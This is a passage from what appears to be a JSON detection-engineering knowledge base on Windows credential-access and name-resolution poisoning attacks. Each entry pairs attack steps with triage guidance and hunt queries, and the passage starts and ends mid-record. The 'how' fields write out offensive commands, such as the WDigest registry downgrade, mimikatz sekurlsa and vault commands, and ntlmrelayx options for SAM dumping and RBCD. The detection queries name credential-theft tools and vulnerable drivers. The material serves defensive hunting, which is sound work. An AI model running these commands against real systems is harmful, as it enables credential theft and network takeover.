2"}],"huntcs":[{"plat":"LogScale","t":"Non-browser process touching Login Data/Cookies/Local State, or SharpChrome/LaZagne=bad / browser itself=white.","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/(Login Data|\\\\User Data\\\\.*Cookies|Local State|SharpChrome|LaZagne|browser::)/i\n| FileName!=/(chrome|msedge|brave|firefox|opera)\\.exe/i\n| groupBy([ComputerName, UserName, FileName, ParentBaseFileName], function=count(as=n))\n| sort(n, order=desc)"}]},{"name":"WDigest Plaintext Credential Harvesting","aka":"UseLogonCredential=1 downgrade","phase":"credaccess","group":"Host / Local","mitre":"T1003.001, T1112","cve":"","sev":"High","summary":"Re-enable WDigest (UseLogonCredential=1) to make LSASS cache cleartext passwords, then harvest cleartext on subsequent logons.","how":"Prereq: local admin. Set reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1. After the user re-logs on, obtain cleartext with mimikatz sekurlsa::wdigest. A persistence-plus-credential-theft technique that deliberately downgrades a feature disabled by default (Win8.1/2012R2 and later).","tools":"reg.exe, mimikatz sekurlsa::wdigest","detect":"Change of the UseLogonCredential registry value to 1 (Sysmon13/4657). Alert on WDigest-related key modifications as highly suspicious.","events":"Sysmon 13, 4657, 4688","mitigate":"Force-deploy UseLogonCredential=0 via GPO/registry and monitor for tampering. Prevent cleartext caching itself with Credential Guard. Block registry modification via EDR.","triage":"On the target host pull Sysmon EID 13/4657 for HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential being set to 1, and use 4688 to identify the modifying process (reg.exe/powershell) and user. Black when the value change is followed by user re-logon (4624) and Sysmon EID 10 lsass access or sekurlsa::wdigest artifacts on the same host (credential theft plus persistence). Since UseLogonCredential is disabled by default on modern OSes, setting it to 1 is almost always high suspicion, but a deliberate, documented change via GPO/config management (SCCM/Intune) for legacy compatibility, with no subsequent lsass dump, is benign.","hunt":[{"plat":"MDE","t":"WDigest UseLogonCredential flipped to 1 = malicious plaintext-cred downgrade / no change = benign","q":"DeviceRegistryEvents\n| where Timestamp > ago(1d)\n| where RegistryKey has @\"SecurityProviders\\WDigest\"\n| where RegistryValueName == \"UseLogonCredential\"\n| where RegistryValueData == \"1\"\n| project Timestamp, DeviceName, RegistryKey, RegistryValueData, PreviousRegistryValueData, InitiatingProcessFileName, InitiatingProcessCommandLine"},{"plat":"Sentinel","t":"4657 registry modification of WDigest UseLogonCredential = malicious / absent = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4657\n| where ObjectName has \"WDigest\"\n| where Properties has \"UseLogonCredential\"\n| project TimeGenerated, Computer, SubjectUserName, ObjectName, OperationType, Properties, ProcessName"}],"huntcs":[{"plat":"Event Search","t":"WDigest UseLogonCredential flipped to 1 (enables plaintext creds)=bad / value 0 or untouched=white.","q":"(event_simpleName=RegSystemConfigValueUpdate OR event_simpleName=RegGenericValueUpdate) RegValueName=\"UseLogonCredential\" RegStringValue=\"1\"\n| stats count by ComputerName, RegObjectName, RegValueName, RegStringValue"}]},{"name":"PPL Bypass to Dump Protected LSASS","aka":"PPLdump / PPLKiller / mimidrv / BYOVD","phase":"credaccess","group":"Host / Local","mitre":"T1003.001, T1068","cve":"","sev":"High","summary":"Neutralize an LSASS process protected by RunAsPPL (Protected Process Light) via a vulnerable driver or known bypass, then dump its memory.","how":"Prereq: local admin. When a normal dump fails under PPL protection, dump lsass with PPLdump (a known PPL bypass), or strip the PPL attribute with mimikatz !+ / !processprotect (mimidrv driver), or use BYOVD (load a vulnerable signed driver and access LSASS from the kernel). Then perform a normal dump + pypykatz parsing. Primarily targets PPL-only environments without Credential Guard.","tools":"PPLdump, PPLKiller, mimidrv(mimikatz), BYOVD(各種脆弱ドライバ)","detect":"Vulnerable driver load (Sysmon 6, DriverLoad). Service creation of an unsigned/known-malicious driver (7045). PPL attribute changes or anomalous LSASS access via the kernel. Microsoft Vulnerable Driver Blocklist violations.","events":"Sysmon 6, 7045, Sysmon 10, 4688","mitigate":"Deploy Credential Guard (VBS) for stronger protection than PPL alone. Block vulnerable driver loads with Microsoft Vulnerable Driver Blocklist / WDAC. Enable HVCI (Memory Integrity). EDR driver monitoring.","triage":"On the target host, check Sysmon EID6 (DriverLoad) and 7045 for load/service-creation of known-vulnerable or unsigned drivers (mimidrv, PPLKiller, RTCore64.sys), and if it chains within the same host/timeframe to Sysmon EID10 lsass.exe access with abnormal GrantedAccess (0x1010/0x1410/0x143a) from a non-legit SourceImage, it is black. 4688 command lines resembling PPLdump.exe/procdump or `!processprotect` artifacts, plus a Microsoft vulnerable-driver-blocklist violation, are decisive. Steady LSASS access by signed AV/backup driver stacks, driver updates during scheduled patching windows, or a known asset-management agent as source lean white — but since BYOVD abuses validly-signed drivers too, decide by whether follow-on credaccess (lsass dump → pypykatz/exfil) actually occurred.","hunt":[{"plat":"MDE","t":"Known vulnerable/BYOVD .sys loaded from user-writable path = malicious PPL bypass / signed driver from system path = benign","q":"DeviceImageLoadEvents\n| where Timestamp > ago(1d)\n| where FileName endswith \".sys\"\n| where FolderPath has_any (@\"\\Temp\\\", @\"\\Users\\\", @\"\\Downloads\\\", @\"\\ProgramData\\\", @\"\\AppData\\\")\n| where FileName has_any (\"RTCore64\",\"gdrv\",\"dbutil\",\"mimidrv\",\"PROCEXP152\",\"kdmapper\",\"truesight\",\"ucorew64\",\"WinRing0\")\n| project Timestamp, DeviceName, FileName, FolderPath, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine"},{"plat":"MDE","t":"OpenProcess against lsass.exe from non-security process = malicious protected-LSASS dump / MsMpEng etc = benign","q":"DeviceEvents\n| where Timestamp > ago(1d)\n| where ActionType == \"OpenProcessApiCall\"\n| where FileName =~ \"lsass.exe\"\n| where InitiatingProcessFileName !in~ (\"MsMpEng.exe\",\"svchost.exe\",\"wmiprvse.exe\",\"csrss.exe\",\"taskmgr.exe\")\n| summarize cnt=count(), cmds=make_set(InitiatingProcessCommandLine,5) by DeviceName, InitiatingProcessFileName\n| order by cnt desc"}],"huntcs":[{"plat":"LogScale","t":"Load of known vulnerable driver (BYOVD)=bad / routine signed driver=white.","q":"#event_simpleName=DriverLoad\n| ImageFileName=/(RTCore64|procexp|dbutil_2_3|DBUtil|mimidrv|gdrv|iqvw64|winio|ATSZIO|PROCEXP152|kprocesshacker)/i\n| groupBy([ComputerName, ImageFileName, SHA256HashData], function=count(as=n))\n| sort(n, order=desc)"},{"plat":"Event Search","t":"PPLdump/PPLKiller execution to strip LSASS PPL protection=bad.","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*PPLdump*\" OR CommandLine=\"*PPLKiller*\" OR CommandLine=\"*PPLmedic*\" OR FileName=\"PPLdump.exe\" OR FileName=\"PPLKiller.exe\")\n| stats count by ComputerName, UserName, FileName, ParentBaseFileName, CommandLine"}]},{"name":"Kerberos Ticket / Key Extraction from LSASS","aka":"sekurlsa::tickets / ekeys / Rubeus dump","phase":"credaccess","group":"Host / Local","mitre":"T1558, T1003.001","cve":"","sev":"High","summary":"Extract Kerberos TGT/TGS tickets and AES keys of currently logged-on users from LSASS memory and use them for Pass-the-Ticket / impersonation.","how":"Prereq: local admin (SeTcbPrivilege/SeDebug). Export .kirbi tickets with mimikatz sekurlsa::tickets /export, and obtain AES256 keys with sekurlsa::ekeys. Rubeus dump / triage extracts the same. Reuse a captured TGT on another host via Pass-the-Ticket (Rubeus ptt / mimikatz kerberos::ptt) for lateral movement. If another user's (admin's) ticket remains in a local admin's session, it leads directly to privilege escalation.","tools":"mimikatz sekurlsa::tickets/ekeys, Rubeus dump/triage/ptt","detect":"Sysmon 10 LSASS access. Reuse of the same TGT from an anomalous host (geo/device mismatch in 4768/4769). Pass-the-Ticket-specific logons (4624 Type 3, ticket encryption-type inconsistencies).","events":"Sysmon 10, 4768, 4769, 4624","mitigate":"Isolate tickets/keys in VSM with Credential Guard. RunAsPPL. Shorten privileged ticket lifetime (TGT lifetime). Restrict admin interactive logons to PAWs to prevent ticket residue. SIEM detection of anomalous reuse.","triage":"On the source host, confirm Sysmon EID10 high-privilege access to lsass.exe (GrantedAccess 0x1010/0x1410, SourceImage = rubeus.exe/mimikatz/PowerShell/rundll32), and correlate with 4688 command lines matching sekurlsa::tickets/ekeys or Rubeus dump/triage at the same time. If a different host then shows 4624 LogonType3 reusing that account's TGT as 4769 from an unusual endpoint (mismatched Ticket Encryption Type/host/geo) — a Pass-the-Ticket chain — it is black. Steady lsass opens by backup/monitoring agents or the EDR itself, legitimate admin tools holding SeDebug, or expected service-account behavior within business hours as a single event lean white.","hunt":[{"plat":"MDE","t":"Rubeus/mimikatz Kerberos ticket/ekeys extraction from LSASS = malicious / none = benign","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where ProcessCommandLine has_any (\"sekurlsa::tickets\",\"sekurlsa::ekeys\",\"kerberos::list /export\",\"asktgt\",\"ptt /ticket\",\"dump /service:\",\"monitor /interval\",\"triage\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName\n| order by Timestamp desc"},{"plat":"Sentinel","t":"Single account's 4769 service-ticket requests from many distinct source IPs = malicious PtT reuse / single host = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4769\n| where TargetUserName !endswith \"$\"\n| summarize srcIPs=dcount(IpAddress), ips=make_set(IpAddress,10), tickets=count() by TargetUserName\n| where srcIPs > 3"}],"huntcs":[{"plat":"Event Search","t":"sekurlsa::tickets/ekeys or Rubeus dump pulling tickets/keys from LSASS=bad / legit Kerberos has no such strings=white.","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*sekurlsa::tickets*\" OR CommandLine=\"*sekurlsa::ekeys*\" OR CommandLine=\"*kerberos::list*\" OR CommandLine=\"*Rubeus*dump*\" OR CommandLine=\"*Rubeus*monitor*\")\n| stats count, values(CommandLine) as cmds by ComputerName, UserName, FileName, ParentBaseFileName\n| sort - count"}]},{"name":"Credential Manager / Vault Dump","aka":"vault::cred / Windows Vault / cmdkey","phase":"credaccess","group":"Host / Local","mitre":"T1555.004","cve":"","sev":"Medium","summary":"Enumerate and decrypt generic/domain credentials and saved RDP credentials stored in Windows Credential Manager (Vault) to steal them.","how":"Prereq: target user context or admin. Enumerate saved credentials with cmdkey /list, decrypt the Vault with mimikatz vault::list / vault::cred, or auto-extract with SharpDPAPI or LaZagne. Targets web credentials and saved RDP passwords. Saved RDP (.rdp + DPAPI blob) can also be decrypted under user operation.","tools":"cmdkey, mimikatz vault::cred, SharpDPAPI, LaZagne","detect":"Access to Vault-related files (%APPDATA%\\Microsoft\\Vault, \\Credentials) (Sysmon 11/4663). cmdkey /list execution, mimikatz vault artifacts.","events":"4663/Sysmon 11, 4688","mitigate":"Operationally prevent storing privileged/shared credentials in the Vault. Disable RDP credential saving (GPO: Do not allow passwords to be saved). Credential Guard, EDR monitoring.","triage":"On the target host, check Sysmon EID11/4663 for reads of `%APPDATA%\\Microsoft\\Vault`, `\\Microsoft\\Credentials`, and `\\Microsoft\\Protect` (DPAPI masterkeys), and if 4688/Sysmon EID1 shows `cmdkey /list`, vault::cred/vault::list, SharpDPAPI, or LaZagne command lines in the same process tree/timeframe, it is black. Bulk enumeration of many credential files, or masterkey decryption immediately followed by lateral movement, raises confidence. Normal Credential Manager access during the user's own logon, Vault reads when launching an RDP client, or a credential-inventory/IT script as source as a one-off lean white.","hunt":[{"plat":"MDE","t":"cmdkey /list or mimikatz vault::cred execution = malicious Vault enumeration / none = benign","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where (FileName =~ \"cmdkey.exe\" and ProcessCommandLine has \"/list\")\n    or ProcessCommandLine has_any (\"vault::cred\",\"vault::list\",\"VaultCli\",\"Get-VaultCredential\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName"},{"plat":"MDE","t":"Non-standard process touching many \\Microsoft\\Vault / \\Credentials files = malicious / vaultsvc etc = benign","q":"DeviceFileEvents\n| where Timestamp > ago(1d)\n| where FolderPath has_any (@\"\\Microsoft\\Vault\", @\"\\Microsoft\\Credentials\")\n| where InitiatingProcessFileName !in~ (\"svchost.exe\",\"vaultsvc.exe\",\"explorer.exe\",\"lsass.exe\",\"System\")\n| summarize cnt=count(), paths=make_set(FolderPath,10) by DeviceName, InitiatingProcessFileName, InitiatingProcessAccountName\n| where cnt > 3"}],"huntcs":[{"plat":"Event Search","t":"vault::cred/VaultCmd list/cmdkey /list enumerating Windows Vault creds=bad / lone cmdkey needs context=whitish.","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*vault::cred*\" OR CommandLine=\"*vault::list*\" OR CommandLine=\"*VaultCmd*/list*\" OR (FileName=\"cmdkey.exe\" AND CommandLine=\"*/list*\") OR CommandLine=\"*\\\\Microsoft\\\\Vault*\")\n| stats count by ComputerName, UserName, FileName, ParentBaseFileName, CommandLine"}]},{"name":"Registry Autologon / Stored Plaintext Credentials","aka":"Winlogon DefaultPassword / unattend.xml / AutoLogon","phase":"credaccess","group":"Host / Local","mitre":"T1552.001, T1552.002","cve":"","sev":"Medium","summary":"Recover credentials left in plaintext in the registry's Winlogon autologon settings, in unattended-install files, or in scripts.","how":"Prereq: local admin or registry/file read access. Check DefaultPassword/DefaultUserName/AutoAdminLogon via reg query 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' (stored in plaintext or in the aforementioned LSA secrets). Additionally, sweep C:\\Windows\\Panther\\unattend.xml, sysprep.inf, Autounattend.xml, various non-GPP scripts (.ps1/.bat), and IIS web.config connectionStrings.","tools":"reg query, findstr /si password *.xml *.ini *.txt, PowerUp, Seatbelt, LaZagne","detect":"Access to the Winlogon key (DefaultPassword). Access to residual Panther/sysprep files. Credential-hunting command lines such as findstr password (4688/Sysmon 1).","events":"4688/Sysmon 1, 4663, Sysmon 13","mitigate":"Discontinue autologon (AutoAdminLogon). Remove unattend/sysprep leftovers after deployment (build cleanup). Prohibit embedding plaintext credentials in scripts/config files; use a credential vault. Regular filesystem credential scans.","triage":"On the target host, check 4663/Sysmon EID13 for access/change to `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon` DefaultPassword/AutoAdminLogon values, and if 4688/Sysmon EID1 shows `reg query ...Winlogon`, `findstr /si password *.xml *.ini`, sweeps of `C:\\Windows\\Panther\\unattend.xml`/sysprep.inf/web.config, or PowerUp/Seatbelt in the same process tree, it is black. Multiple credential-hunting commands in a short window followed by logon with the discovered account raise confidence. Normal sysprep/Autounattend reads right after OS deployment, SCCM/MDT provisioning, or a vuln scanner/config-audit tool as source as a one-off lean white.","hunt":[{"plat":"MDE","t":"Access/modification of Winlogon DefaultPassword/AutoAdminLogon = malicious stored plaintext creds / none = benign","q":"DeviceRegistryEvents\n| where Timestamp > ago(1d)\n| where RegistryKey has @\"\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"\n| where RegistryValueName in~ (\"DefaultPassword\",\"AutoAdminLogon\",\"DefaultUserName\",\"DefaultDomainName\")\n| project Timestamp, DeviceName, ActionType, RegistryKey, RegistryValueName, RegistryValueData, InitiatingProcessFileName, InitiatingProcessCommandLine"},{"plat":"MDE","t":"findstr/Select-String password hunting or access to unattend.xml/sysprep leftovers = malicious / none = benign","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where (FileName in~ (\"findstr.exe\",\"reg.exe\",\"powershell.exe\") and ProcessCommandLine has_any (\"password\",\"DefaultPassword\",\"AutoAdminLogon\"))\n    or ProcessCommandLine has_any (@\"\\Panther\\unattend.xml\",\"sysprep.inf\",\"unattend.xml\",\"Autounattend.xml\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName"}],"huntcs":[{"plat":"Event Search","t":"Winlogon DefaultPassword, unattend/sysprep leftovers, or findstr password credential hunting=bad / rare legit maintenance=white.","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*findstr*password*\" OR CommandLine=\"*DefaultPassword*\" OR CommandLine=\"*unattend.xml*\" OR CommandLine=\"*sysprep.inf*\" OR CommandLine=\"*\\\\Panther\\\\*\" OR CommandLine=\"*query*Winlogon*\")\n| stats count by ComputerName, UserName, FileName, ParentBaseFileName, CommandLine\n| sort - count"}]},{"name":"LLMNR / NBT-NS Poisoning","aka":"Responder, multicast name-resolution poisoning","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1557.001","cve":"","sev":"High","summary":"A man-in-the-middle attack that sends spoofed responses to LLMNR/NBT-NS broadcasts sent on name-resolution failure, capturing the victim's NTLMv1/v2 authentication (Net-NTLM hashes).","how":"Sit in the same broadcast domain and answer LLMNR (UDP 5355) / NBT-NS (UDP 137) queries with your own IP using Responder or similar. When a victim accesses a typo or nonexistent share (\\\\srv01), SMB/HTTP authentication is triggered, yielding a Net-NTLMv2 hash. Crack captured hashes offline with hashcat, or relay them to hosts with SMB signing disabled. Prereqs are L2 reachability and LLMNR/NBT-NS being enabled.","tools":"Responder (-I eth0 -wv), Inveigh (PowerShell/C#), hashcat -m 5600, ntlmrelayx","detect":"A honey-client that injects LLMNR/NBT-NS spoof detection from your own host (periodically resolving a nonexistent hostname and monitoring whether a response comes back) is effective. Monitor authentication attempts to unexpected hosts over SMB/HTTP, and hosts receiving many Net-NTLM authentications in a short window.","events":"Sysmon 22 (DNSQuery異常), Security 4624/4625 (NTLM logon), ネットワークセンサでのLLMNR/NBT-NS応答検知","mitigate":"Disable LLMNR via GPO (HKLM\\...\\DNSClient EnableMulticast=0), disable NetBIOS over TCP/IP (DHCP option or NIC setting). Eliminate fallback with correct internal DNS operation. Require SMB signing to kill relay targets.","triage":"Via a network sensor/honey-client, monitor for a rogue responder that instantly answers LLMNR (UDP5355)/NBT-NS (UDP137) queries for non-existent hostnames (e.g. `\\\\srv01-typo`); if a single source IP receives Net-NTLMv2 auth from many victims in a short window (that host's Security 4624/4625 spike as NTLM/LogonType3), it is black. Victim Sysmon EID22 showing unexpected name resolution chained to EID3 connections to that responder IP raises confidence. Fallback resolution for legit services not in DNS, endpoints authenticating normally to existing internal servers, or a single event where the answering host is a known-good one lean white.","hunt":[{"plat":"MDE","t":"One RemoteIP conversing with many devices over LLMNR(5355)/NBT-NS(137) = malicious Responder poisoner / normal DNS fallback = benign","q":"DeviceNetworkEvents\n| where Timestamp > ago(1d)\n| where RemotePort in (5355, 137)\n| summarize clients=dcount(DeviceName), hits=count(), devs=make_set(DeviceName,15) by RemoteIP\n| where clients > 10\n| order by clients desc"},{"plat":"Sentinel","t":"One host receiving Type3 logons from many distinct accounts in a short window = malicious post-poison Net-NTLM harvest / few = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (4624, 4625)\n| where LogonType == 3 and WorkstationName != \"\"\n| summarize accounts=dcount(TargetUserName), cnt=count() by Computer, WorkstationName\n| where accounts > 10 and cnt > 30"}],"huntcs":[{"plat":"Event Search","t":"One host receiving name-resolution queries from many peers on 5355/137=Responder poisoner=bad / sparse per-host lookups=white.","q":"event_simpleName=NetworkReceiveAcceptIP4 (LocalPort=5355 OR LocalPort=137)\n| stats dc(RemoteAddressIP4) as peers, count as events by ComputerName, LocalPort\n| where peers > 10\n| sort - peers"}]},{"name":"mDNS Poisoning","aka":"Multicast DNS spoofing, Responder -m","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1557.001","cve":"","sev":"Medium","summary":"A variant that spoofs responses to mDNS (.local) name resolution used by Apple Bonjour and others, capturing authentication like LLMNR.","how":"Intercept and spoof mDNS queries to 224.0.0.251:5353 with Responder, hijacking .local hostname resolution. Especially effective in mixed environments (Mac/IoT/printers). An easily overlooked path that often persists even where LLMNR/NBT-NS have been disabled. Crack or relay the captured Net-NTLM.","tools":"Responder (-m有効), Inveigh","detect":"Monitor mDNS (UDP 5353) response patterns within the segment, and mass mDNS responses from unexpected devices. .local name-resolution tests via a honey-client.","events":"ネットワークIDSのmDNSシグネチャ, 4624/4625","mitigate":"If unnecessary, block UDP 5353 at the firewall and stop the mDNS responder service. Isolate IoT/clients from AD authentication systems via segmentation.","triage":"With a network IDS, monitor segment mDNS (UDP5353 to 224.0.0.251) responses; if an unexpected device answers .local name resolution in bulk and instantly (a path that survives even after LLMNR/NBT-NS are disabled) and victims then authenticate to that responder IP with clustered Security 4624/4625 (NTLM), it is black. Corroborate with a honey-client .local test to see whether an unknown IP replies. Legitimate mDNS advertisements in mixed Mac/IoT/printer environments (Bonjour, AirPrint), steady .local responses from known devices, or pure name resolution with no induced authentication lean white.","hunt":[{"plat":"MDE","t":"One RemoteIP answering mDNS(UDP5353) to many devices = malicious Responder -m .local spoof / few legit (printers) = benign","q":"DeviceNetworkEvents\n| where Timestamp > ago(1d)\n| where RemotePort == 5353\n| summarize clients=dcount(DeviceName), hits=count(), devs=make_set(DeviceName,15) by RemoteIP\n| where clients > 10\n| order by clients desc"}],"huntcs":[{"plat":"Event Search","t":"One host receiving mDNS(5353) queries from many peers=mDNS poisoning=bad / printer/AirPlay steady chatter=white (threshold separates).","q":"event_simpleName=NetworkReceiveAcceptIP4 LocalPort=5353\n| stats dc(RemoteAddressIP4) as peers, count as events by ComputerName, ContextBaseFileName\n| where peers > 15\n| sort - peers"}]},{"name":"WPAD / PAC Poisoning","aka":"Web Proxy Auto-Discovery abuse","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1557.001","cve":"CVE-2016-3213","sev":"High","summary":"Hijack the WPAD proxy name auto-discovered by browsers/OSes via name-resolution poisoning to intercept all HTTP traffic and force NTLM authentication.","how":"Spoof responses for the \"WPAD\" hostname via LLMNR/NBT-NS/DNS and distribute a malicious wpad.dat. Returning 407 Proxy Authentication Required to proxied HTTP requests causes the browser to automatically send NTLM authentication, enabling Net-NTLM capture with no user interaction. Combine with ntlmrelayx's WPAD/proxy feature.","tools":"Responder (WPAD/proxy-auth), ntlmrelayx (--wpad-host)","detect":"Divergence between WPAD-host name-resolution requests and the responding source, unexpected proxy settings, NTLM accompanied by Proxy-Authenticate 407.","events":"4624/4625, プロキシ/Webフィルタログ","mitigate":"Apply MS16-077 (disables WPAD NTLM auto-authentication and eliminates name resolution over HTTP). Register a legitimate wpad record in DNS (or disable WPAD via GPO), and disable browser automatic proxy detection.","triage":"On victims, check Sysmon EID22 and network logs for divergence between the resolved 'wpad' hostname and the actual responding IP, then in proxy/web-filter logs confirm that a wpad.dat fetch is followed by automatic NTLM emission triggered by HTTP 407 Proxy Authentication Required, with Security 4624/4625 (NTLM) clustering on the host posing as that proxy — auth firing with no user action is the tell, so it is black. Proxy auto-config via a legitimate WPAD server (registered DNS A record, matching IP), normal NTLM to the corporate proxy, or 407 from a known proxy lean white.","hunt":[{"plat":"MDI","t":"Many DNS queries for wpad = pre-condition for WPAD spoofing / benign if a real wpad record is registered","q":"IdentityQueryEvents\n| where Timestamp > ago(1d)\n| where QueryType == \"DNS\"\n| where QueryTarget has \"wpad\"\n| summarize cnt=count(), hosts=make_set(DeviceName,20), srcIPs=make_set(IPAddress,20) by QueryTarget\n| order by cnt desc"},{"plat":"MDE","t":"wpad.dat fetched from an unexpected IP = malicious PAC poisoning / fetch from the sanctioned proxy host = benign","q":"DeviceNetworkEvents\n| where Timestamp > ago(1d)\n| where RemoteUrl has \"wpad\" or RemoteUrl endswith \"wpad.dat\"\n| summarize cnt=count(), urls=make_set(RemoteUrl,10) by DeviceName, RemoteIP, InitiatingProcessFileName\n| order by cnt desc"}],"huntcs":[{"plat":"Event Search","t":"Many hosts resolving wpad in a short window=WPAD/PAC poisoning=bad / near-zero at baseline=white.","q":"event_simpleName=DnsRequest (DomainName=\"wpad*\" OR DomainName=\"*wpad.*\")\n| stats dc(ComputerName) as hosts, count as reqs by DomainName\n| where hosts > 20\n| sort - hosts"}]},{"name":"mitm6 - IPv6 DNS Takeover","aka":"DHCPv6 spoofing, rogue IPv6 DNS","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1557.003, T1557","cve":"","sev":"Critical","summary":"Abuse Windows' default preference for IPv6 by setting yourself as the DNS server via malicious DHCPv6 responses, gaining full control of name resolution and chaining to NTLM relay.","how":"Answer DHCPv6 Solicit/Request with mitm6 and assign the victim a link-local IPv6 DNS (= the attacker). Hijack resolution of WPAD or any FQDN and relay to LDAP/LDAPS with ntlmrelayx. Powerful because machine-account authentications fire periodically even with no user interaction. A typical chain is mitm6 + ntlmrelayx -6 --delegate-access to establish RBCD. Prereq is IPv6 being enabled on clients (enabled by default).","tools":"mitm6 (-d domain.local), ntlmrelayx.py -6 -t ldaps://dc --delegate-access","detect":"Appearance of an illegitimate DHCPv6 server, a client's DNS server changing to a fe80:: link-local address, mass dynamic DNS update failures.","events":"DHCPサーバ/スイッチのDHCPv6ガードログ, 4624 (NTLM, マシンアカウント), 5136 (RBCD属性変更)","mitigate":"Rather than disabling IPv6 unnecessarily, enable RA Guard/DHCPv6 Guard on switches. Statically register the WPAD DNS entry. Neutralize relay targets by requiring LDAP signing + channel binding (EPA).","triage":"In DHCPv6-guard logs and a network sensor, look for a rogue DHCPv6 server answering Solicit/Request so a client's DNS flips to an fe80:: link-local address; if victims (especially machine accounts) then emit Security 4624 (NTLM) to the attacker host periodically with no user action, and DC 5136 shows msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD) changes in the same window, it is black. Mass dynamic-DNS update failures corroborate. A legitimate DHCPv6 server in an IPv6-operated environment, RA/DHCPv6 from approved gear, or no effect on IPv6-disabled hosts lean white — but a DHCPv6 response where IPv6 is not used internally is black-by-default and must be investigated.","hunt":[{"plat":"Sentinel","t":"5136 write to msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD) = malicious post-mitm6 delegation takeover / sanctioned delegation = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where Properties has \"msDS-AllowedToActOnBehalfOfOtherIdentity\"\n| project TimeGenerated, Computer, SubjectUserName, ObjectName, OperationType, Properties\n| order by TimeGenerated desc"},{"plat":"MDE","t":"DNS(53) to link-local fe80:: or rogue DHCPv6(547) across many devices = malicious rogue IPv6 DNS / one-off = benign","q":"DeviceNetworkEvents\n| where Timestamp > ago(1d)\n| where (RemotePort == 547) or (RemotePort == 53 and RemoteIP startswith \"fe80\")\n| summarize cnt=count(), devs=dcount(DeviceName), hosts=make_set(DeviceName,15) by RemoteIP, RemotePort\n| where devs > 3"}],"huntcs":[{"plat":"Event Search","t":"mitm6 forces victims to WPAD; a sudden surge of many hosts resolving wpad=IPv6 DNS takeover=bad / zero at baseline=white.","q":"event_simpleName=DnsRequest (DomainName=\"wpad*\" OR DomainName=\"*proxy*wpad*\")\n| bin _time span=10m as win\n| stats dc(ComputerName) as hosts, count as reqs by win, DomainName\n| where hosts > 20\n| sort - hosts"},{"plat":"Identity Protection","t":"DHCPv6 spoofing + fe80:: link-local DNS switch is not visible to Falcon EDR (IP4 only); correlate via Identity Protection.","q":"// Falcon Identity Protection detection: mitm6 / rogue IPv6 DHCPv6-DNS takeover leading to NTLM relay and RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity) machine-account abuse. No attacker-host IP4 endpoint footprint; monitor 5136 RBCD attribute change + anomalous machine-account NTLM authentication in IdP."}]},{"name":"NTLM Relay to SMB","aka":"SMB relay, ntlmrelayx SMB","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1557.001","cve":"CVE-2008-4037","sev":"High","summary":"The classic relay: forward captured NTLM authentication to another host's SMB to authenticate and run commands / dump the SAM / access files.","how":"Capture hashes with Responder (SMB/HTTP disabled) -> ntlmrelayx relays to a target with SMB signing disabled. If the relayed identity holds local admin, run commands with -c, dump SAM/LSA with --dump-sam, and reuse the session via socks. Prereqs: the target's SMB signing is 'disabled/not required' and the relayed account has privileges. Reflection back to the originating host has been impossible since MS08-068.","tools":"ntlmrelayx.py -tf targets.txt -smb2support -c/--dump-sam/-socks, Responder","detect":"Consecutive NTLM authentications from a single source to multiple hosts, immediate admin operations after a non-interactive logon (service creation 7045 / PsExec). Relays are characterized by a mismatch between source IP and authenticating principal.","events":"4624 (Logon Type 3, NTLM), 4672, 7045 (サービス作成), 5140/5145 (共有アクセス)","mitigate":"Require SMB signing on all hosts (both server/client GPO: RequireSecuritySignature=1). Cut off the entry point with name-resolution poisoning countermeasures. Minimize local admin share privileges, deploy LAPS.","triage":"On the target member server/host, confirm Security 4624 (LogonType3, NTLM) where the authenticating principal's normal host does not match the source IP (i.e. auth from the relay's IP), and if it is immediately followed by 4672 (special privileges) → 7045 (service creation)/5140·5145 (ADMIN$/C$ share access, RelativeTargetName) → SAM/LSA reads (like --dump-sam) fanning from one source to multiple hosts, it is black. Concentration on SMB-signing-not-required targets is the tell. Legitimate PsExec/SCCM asset management or backup-service-account access to admin shares, where source and account are consistent and it is a business-hours one-off, lean white.","hunt":[{"plat":"Sentinel","t":"One source IP fanning Type3 logons across many hosts = malicious NTLM relay / normal single-host access = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4624 and LogonType == 3\n| where IpAddress != \"-\" and IpAddress != \"::1\"\n| summarize targets=dcount(Computer), accounts=dcount(TargetUserName), hosts=make_set(Computer,15) by IpAddress\n| where targets > 5"},{"plat":"Sentinel","t":"Concentrated ADMIN$/C$/IPC$ admin-share access (5140/5145) = malicious relay-to-PsExec / few from an admin host = benign","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (5140, 5145)\n| where ShareName has_any (\"ADMIN$\",\"C$\",\"IPC$\")\n| summarize shares=make_set(ShareName,10), cnt=count(), files=make_set(RelativeTargetName,10) by IpAddress, SubjectUserName, Computer\n| 